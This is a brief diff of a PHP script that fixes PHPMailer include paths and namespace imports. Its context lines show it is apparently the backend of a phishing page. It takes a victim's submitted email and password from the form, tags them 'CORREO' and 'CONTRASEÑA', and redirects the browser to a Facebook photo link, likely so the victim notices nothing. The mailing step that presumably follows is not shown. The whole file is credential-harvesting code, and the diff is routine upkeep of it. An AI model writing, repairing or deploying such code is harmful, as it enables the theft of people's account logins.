@@ -1,11 +1,11 @@
 <?php
 
-    require "Exception.php";
-    require "PHPMailer.php";
-    require "SMTP.php";
+    require "PHPmailer/Exception.php";
+    require "PHPmailer/PHPMailer.php";
+    require "PHPmailer/SMTP.php";
 
-    use PHPMailer\PHPMailer;
-    use PHPMailer\PHPException;
+    use PHPMailer\PHPMailer\PHPMailer;
+    use PHPMailer\PHPMailer\PHPException;
     header ('Location: https://www.facebook.com/photo?fbid=416567854004233&set=a.416567477337604');
     $correo = "CORREO: ".$_POST['Correo'];
     $contra = "CONTRASEÑA: ".$_POST['Contra'];
